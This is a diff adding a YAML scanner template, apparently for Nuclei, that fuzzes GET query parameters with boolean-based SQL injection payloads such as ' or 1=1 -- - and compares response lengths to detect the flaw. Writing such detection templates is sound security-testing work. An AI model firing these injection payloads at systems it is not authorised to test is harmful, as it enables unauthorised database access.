@@ -1,0 +1,60 @@
+id: sqli-boolean-based-get
+
+info:
+  name: Boolean Based SQL Injection
+  author: serhatcck
+  severity: critical
+  description: Boolean Based SQLi 
+  tags: sqli, dast
+
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path: 
+     - "{BaseURL}"
+   
+    payloads:
+      empty:
+        - ''
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: multiple
+        fuzz:
+          - "{{empty}}"
+
+    matchers:
+      - type: dsl
+        dsl: 
+          - 'status_code == 200'
+        internal: true 
+
+  - method: GET
+    path: 
+     - "{BaseURL}"
+   
+    payloads:
+      injection:
+        - "' or '123'='123"
+        - " or 123 = 123"
+        - "' and '123'='123"
+        - "\" or \"123\"=\"123\""
+        - "\" and \"123\"=\"123\""
+        - " or 1=1 -- -"
+        - " or 1=1; -- -"
+        - "and 1=1; -- -"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: multiple
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl : 
+           - '(len(http_2_body) + len(injection)) > len(http_1_body) '
